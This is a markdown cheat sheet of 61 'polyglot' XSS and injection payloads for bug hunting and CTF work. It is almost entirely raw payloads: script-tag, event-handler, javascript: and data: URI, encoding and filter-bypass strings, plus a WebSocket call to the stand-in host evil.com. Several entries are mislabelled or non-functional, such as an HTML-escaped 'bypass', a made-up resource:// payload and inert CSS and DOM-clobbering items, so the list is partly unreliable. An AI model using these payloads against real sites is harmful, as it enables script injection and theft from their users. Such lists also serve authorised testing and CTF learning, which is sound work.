# Polyglot Payloads for Bug Hunting & CTF

A collection of 60+ polyglot payloads designed to work in multiple contexts including JavaScript, HTML, CSS, and various parser environments.

## JavaScript/HTML Polyglots

1. **Basic Alert Polyglot**
   ```javascript
   javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
   ```

2. **Multi-Context Polyglot**
   ```javascript
   /*'/*"/*`/*--></noscript></title></textarea></style></template></noembed></script><html onmouseover="/*<svg/*/onload=alert(1)//">
   ```

3. **SVG with JavaScript**
   ```javascript
   <svg/onload=alert(1)//
   ```

4. **CSS Breakout Polyglot**
   ```javascript
   </style><script>alert(1)</script>
   ```

5. **URL Encoding Bypass**
   ```javascript
   javascript://%0Aalert(1)
   ```

6. **Data URI Polyglot**
   ```javascript
   data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+
   ```

7. **Comment Break Polyglot**
   ```javascript
   <!--<script>alert(1)</script>-->
   ```

8. **Multi-Language Injection**
   ```javascript
   ';alert(1);'//";alert(1);"//`;alert(1);`//--></script><script>alert(1)</script>
   ```

9. **Template Literal Polyglot**
   ```javascript
   ${alert(1)}
   ```

10. **Unicode Escape Polyglot**
    ```javascript
    \u0061\u006c\u0065\u0072\u0074(1)
    ```

## HTML Entity & Encoding Polyglots

11. **HTML Entity Bypass**
    ```html
    &lt;script&gt;alert(1)&lt;/script&gt;
    ```

12. **Hex Encoding Polyglot**
    ```html
    &#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
    ```

13. **Decimal Encoding Polyglot**
    ```html
    &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
    ```

14. **Mixed Encoding Polyglot**
    ```html
    <scr&#x69;pt>alert(1)</scr&#x69;pt>
    ```

15. **UTF-7 Bypass**
    ```html
    +ADw-script+AD4-alert(1)+ADw-/script+AD4-
    ```

## CSS Injection Polyglots

16. **CSS Expression Polyglot**
    ```css
    expression(alert(1))
    ```

17. **CSS Import Polyglot**
    ```css
    @import 'javascript:alert(1)'
    ```

18. **CSS URL Polyglot**
    ```css
    background:url('javascript:alert(1)')
    ```

19. **CSS Animation Polyglot**
    ```css
    {animation:x;}\@keyframes x{from{background:red;}to{background:green;}}
    ```

20. **CSS Selector Polyglot**
    ```css
    [style*="x:expression(alert(1))"] { color: red; }
    ```

## Advanced Multi-Context Polyglots

21. **Universal XSS Polyglot**
    ```javascript
    '"><img src=x onerror=alert(1)>
    ```

22. **Template Injection Polyglot**
    ```javascript
    ${7*7}<%= 7*7 %>#{7*7}
    ```

23. **JSON Breakout Polyglot**
    ```javascript
    {"test":"</script><script>alert(1)</script>"}
    ```

24. **XML Injection Polyglot**
    ```xml
    <![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
    ```

25. **SVG XML Polyglot**
    ```xml
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
    ```

26. **MathML Polyglot**
    ```html
    <math href="javascript:alert(1)">CLICKME</math>
    ```

27. **IFrame Sandbox Bypass**
    ```html
    <iframe srcdoc="<script>alert(1)</script>"></iframe>
    ```

28. **Object Tag Polyglot**
    ```html
    <object data="javascript:alert(1)"></object>
    ```

29. **Embed Tag Polyglot**
    ```html
    <embed src="javascript:alert(1)">
    ```

30. **Base Tag Hijack**
    ```html
    <base href="javascript:alert(1)//">
    ```

## Protocol Handler Polyglots

31. **JavaScript Protocol**
    ```javascript
    javascript:alert(1)
    ```

32. **Data Protocol**
    ```javascript
    data:text/html,<script>alert(1)</script>
    ```

33. **Vbscript Protocol**
    ```vbscript
    vbscript:alert(1)
    ```

34. **About Protocol**
    ```html
    about:<svg onload=alert(1)>
    ```

35. **Resource Protocol**
    ```html
    resource://path/to/alert(1)
    ```

## DOM Clobbering Polyglots

36. **Name Clobbering**
    ```html
    <form id="alert"><input name="1" value="alert(1)">
    ```

37. **Document Write Polyglot**
    ```javascript
    document.write('<script>alert(1)</script>')
    ```

38. **InnerHTML Polyglot**
    ```javascript
    element.innerHTML = '<img src=x onerror=alert(1)>'
    ```

39. **Eval Breakout**
    ```javascript
    eval('al' + 'ert(1)')
    ```

40. **Function Constructor**
    ```javascript
    Function('alert(1)')()
    ```

## Filter Bypass Polyglots

41. **Case Variation**
    ```javascript
    <ScRiPt>alert(1)</ScRiPt>
    ```

42. **White Space Bypass**
    ```javascript
    <script >alert(1)</script>
    ```

43. **Null Byte Injection**
    ```javascript
    <script%00>alert(1)</script>
    ```

44. **Line Break Injection**
    ```javascript
    <script
    >alert(1)</script>
    ```

45. **Tab Injection**
    ```javascript
    <script\t>alert(1)</script>
    ```

## Advanced Techniques

46. **Service Worker Hijack**
    ```javascript
    navigator.serviceWorker.register('data:application/javascript,alert(1)')
    ```

47. **WebSocket Injection**
    ```javascript
    new WebSocket('ws://evil.com/ws')
    ```

48. **PostMessage Exploit**
    ```javascript
    postMessage('alert(1)', '*')
    ```

49. **LocalStorage XSS**
    ```javascript
    <script>eval(localStorage.getItem('xss'))</script>
    ```

50. **Cookie Injection**
    ```javascript
    document.cookie = 'xss=alert(1); path=/'
    ```

51. **History Manipulation**
    ```javascript
    history.pushState({}, '', 'javascript:alert(1)')
    ```

52. **Location Hijack**
    ```javascript
    location.href = 'javascript:alert(1)'
    ```

53. **Window Open Exploit**
    ```javascript
    window.open('javascript:alert(1)')
    ```

54. **Import Scripts**
    ```javascript
    import('data:application/javascript,alert(1)')
    ```

55. **Dynamic Import**
    ```javascript
    import(`data:application/javascript,alert(1)`)
    ```

## Special Context Polyglots

56. **Markdown Injection**
    ```markdown
    [Click me](javascript:alert(1))
    ```

57. **URL Parameter**
    ```url
    https://example.com?param=<script>alert(1)</script>
    ```

58. **HTTP Header Injection**
    ```http
    Location: javascript:alert(1)
    ```

59. **SQL Injection + XSS**
    ```sql
    ' OR 1=1; -- <script>alert(1)</script>
    ```

60. **File Upload Bypass**
    ```html
    <script>alert(1)</script>.png
    ```

61. **Original Requested Polyglot**
    ```javascript
   /*-/*/*\/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
    ```

## Usage Notes

- Always test payloads in your target environment
- Modify payloads based on context and filters
- Use URL encoding when necessary
- Be aware of Content Security Policy (CSP) restrictions
- Test in multiple browsers for compatibility

## Legal & Ethical Use

These payloads are provided for:
- Security research
- Bug bounty programs
- CTF challenges
- Educational purposes

Always obtain proper authorization before testing on any system.

## File Information
- Total payloads: 61
- Categories: 8
- File format: Markdown (.md)
- Created for: Bug hunting & CTF challenges

This file contains 61 polyglot payloads organized by category with proper documentation for ethical use in security testing.
